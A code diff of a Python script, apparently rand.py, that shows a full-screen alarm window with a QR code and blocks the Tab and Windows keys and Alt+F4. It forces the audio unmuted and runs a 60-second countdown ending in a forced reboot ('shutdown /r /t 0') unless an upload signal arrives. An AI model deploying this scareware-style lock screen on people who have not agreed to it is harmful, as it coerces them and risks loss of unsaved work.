@@ -11,8 +11,6 @@ import socket
 import qrcode
 import subprocess
 import time
-import threading
-import queue
 
 devices = AudioUtilities.GetSpeakers()  
 volume_control = devices.EndpointVolume
@@ -25,6 +23,7 @@ keyboard.block_key('left windows')
 keyboard.block_key('right windows')
 keyboard.add_hotkey('alt+f4', lambda: None) 
 keyboard.add_hotkey('alt+escape', lambda: None) 
+
 def enforce_unmute():
     if volume_control.GetMute() == 1:
         volume_control.SetMute(0, None)
@@ -56,14 +55,14 @@ def get_local_ip():
     return ip
 
 def generate_qr_and_run():
-    # Delete old QR code if exists so app.py can generate a fresh one
-    qr_filename = "qr.png"
-    if os.path.exists(qr_filename):
-        try:
-            os.remove(qr_filename)
-            print(f"Removed old QR code: {qr_filename}")
-        except Exception as e:
-            print(f"Could not remove old QR code: {e}")
+    # Delete old QR code and signal files
+    for f in ["qr.png", "shutdown_signal.txt"]:
+        if os.path.exists(f):
+            try:
+                os.remove(f)
+                print(f"Removed old file: {f}")
+            except Exception as e:
+                print(f"Could not remove {f}: {e}")
     
     print("\nStarting Flask Backend Server...")
     print("Waiting for app.py to generate QR code...")
@@ -74,48 +73,24 @@ def generate_qr_and_run():
     
     print(f"Using Python: {python_exe}")
     
-    # Start app.py as a non-blocking subprocess with output capture
+    # Start app.py WITHOUT output capture to prevent deadlock
     global app_process
-    app_process = subprocess.Popen(
-        [python_exe, "app.py"],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        universal_newlines=True,
-        bufsize=1
-    )
-    
-    # Start background thread to read output
-    output_thread = threading.Thread(target=read_app_output, daemon=True)
-    output_thread.start()
+    app_process = subprocess.Popen([python_exe, "app.py"])
     
     # Wait for QR code to be generated (max 10 seconds)
     max_wait = 10
     waited = 0
-    while not os.path.exists(qr_filename) and waited < max_wait:
+    while not os.path.exists("qr.png") and waited < max_wait:
         time.sleep(0.5)
         waited += 0.5
     
-    if os.path.exists(qr_filename):
+    if os.path.exists("qr.png"):
         print(f"✅ QR code detected! Ready to display UI.")
     else:
         print(f"⚠️ Warning: QR code not found after {max_wait}s, proceeding anyway...")
 
 # Global variable to track app.py process
 app_process = None
-output_queue = queue.Queue()
-
-def read_app_output():
-    """Background thread to read app.py output without blocking"""
-    global app_process
-    if app_process and app_process.stdout:
-        try:
-            for line in iter(app_process.stdout.readline, ''):
-                if line:
-                    output_queue.put(line.strip())
-                if app_process.poll() is not None:
-                    break
-        except:
-            pass
 
 def togglecol():
     current=root.cget("bg")
@@ -141,22 +116,43 @@ def alarm():
 
 def on_closing():
     global app_process
-    keyboard.unblock_key('tab')
-    keyboard.unblock_key('left windows')
-    keyboard.unblock_key('right windows')
-    keyboard.remove_hotkey('alt+f4')
-    keyboard.remove_hotkey('alt+escape')
+    print("\n🛑 Closing rand.py...")
+    
+    try:
+        keyboard.unblock_key('tab')
+        keyboard.unblock_key('left windows')
+        keyboard.unblock_key('right windows')
+        keyboard.remove_hotkey('alt+f4')
+        keyboard.remove_hotkey('alt+escape')
+    except:
+        pass
     
     # Terminate app.py if it's still running
-    if app_process and app_process.poll() is None:
-        print("Terminating app.py process...")
-        app_process.terminate()
+    if app_process:
         try:
-            app_process.wait(timeout=3)
-        except subprocess.TimeoutExpired:
-            app_process.kill()
+            if app_process.poll() is None:
+                print("Terminating app.py process...")
+                app_process.terminate()
+                app_process.wait(timeout=2)
+        except:
+            try:
+                app_process.kill()
+            except:
+                pass
     
-    root.destroy()
+    try:
+        root.quit()
+    except:
+        pass
+    
+    try:
+        root.destroy()
+    except:
+        pass
+    
+    # Force exit
+    os._exit(0)
+
 def gifframes(path):
     frames = []
     i = 0
@@ -182,47 +178,26 @@ def exit(event, root):
 
 def check_shutdown_signal():
     """Continuously check for shutdown signal from app.py"""
-    global app_process
-    
-    # Check for shutdown signal file
-    if os.path.exists("shutdown_signal.txt"):
-        print("\n✅ Receipt verified! Shutting down gracefully...")
-        # Clean up signal file
-        try:
-            os.remove("shutdown_signal.txt")
-        except:
-            pass
-        
-        # End rand.py execution
-        on_closing()
-        return
-    
-    # Check app.py output from queue (non-blocking)
     try:
-        while not output_queue.empty():
-            line = output_queue.get_nowait()
-            print(f"[app.py] {line}")
-            if "image 1/1" in line.lower():
-                print("\n✅ Image processing detected! Shutting down gracefully...")
-                # End rand.py execution
-                on_closing()
-                return
-    except queue.Empty:
-        pass
+        # Check for shutdown signal file
+        if os.path.exists("shutdown_signal.txt"):
+            print("\n✅ Image uploaded detected! Shutting down gracefully...")
+            on_closing()
+            return
     except Exception as e:
-        print(f"Error checking output: {e}")
+        print(f"Error in check_shutdown_signal: {e}")
     
-    # Check again in 500ms
-    root.after(500, check_shutdown_signal)
-    # Check again in 500ms
-    root.after(500, check_shutdown_signal)
+    # Check again in 300ms (faster polling)
+    try:
+        root.after(300, check_shutdown_signal)
+    except:
+        pass
 
 def warningui():
-
     left_frame = tk.Frame(root)
     left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=50, pady=50)
-    root.bind("<Escape>", lambda event: exit(event, root))
-    root.bind("<Escape><0>", lambda event: exit(event, root))
+    root.bind("<Escape>", lambda event: on_closing())
+    root.bind("<Escape><0>", lambda event: on_closing())
     right_frame = tk.Frame(root)
     right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=50, pady=50)
     alarm_label = tk.Label(left_frame)
@@ -251,7 +226,7 @@ def warningui():
     timer_label = tk.Label(left_frame, text="01:00", font=timer_font)
     timer_label.pack(pady=10, expand=True, anchor="n")
 
-    countdown(60, timer_label)#change timer optional
+    countdown(60, timer_label)
     try:
         qr_image = Image.open("qr.png")
         qr_image = qr_image.resize((450, 450), Image.Resampling.LANCZOS)
@@ -260,20 +235,20 @@ def warningui():
         qr_label.image = qr_photo
         qr_label.pack(expand=True)
     except Exception as e:
-        print(f"Error loading qr.jpeg: {e}")
+        print(f"Error loading qr.png: {e}")
         error_label = tk.Label(right_frame, text="[ QR Code Missing ]", font=("Helvetica", 24), fg="red", bg="white")
         error_label.pack(expand=True)
+    
     root.protocol("WM_DELETE_WINDOW", on_closing)
     root.bind("<Alt-F4>", lambda e: "break") 
     root.bind("<F1>", lambda e: "break")
-    root.bind("Alt-Escape>", lambda e: "break")
-
-    root.bind("<Escape>", lambda event: on_closing())
+    root.bind("<Alt-Escape>", lambda e: "break")
     
     # Start checking for shutdown signal from app.py
     check_shutdown_signal()
     
     root.mainloop()
+
 def countdown(time_left, label):
     if time_left >= 0:
         mins, secs = divmod(time_left, 60)
@@ -284,7 +259,6 @@ def countdown(time_left, label):
         label.config(text="00:00\nSHUTTING DOWN...", fg="white")
         os.system("shutdown /r /t 0")
 
-
 # Start app.py and wait for QR code generation
 generate_qr_and_run()
 
@@ -293,4 +267,3 @@ togglecol()
 alarm()
 enforce_unmute()
 warningui()
-
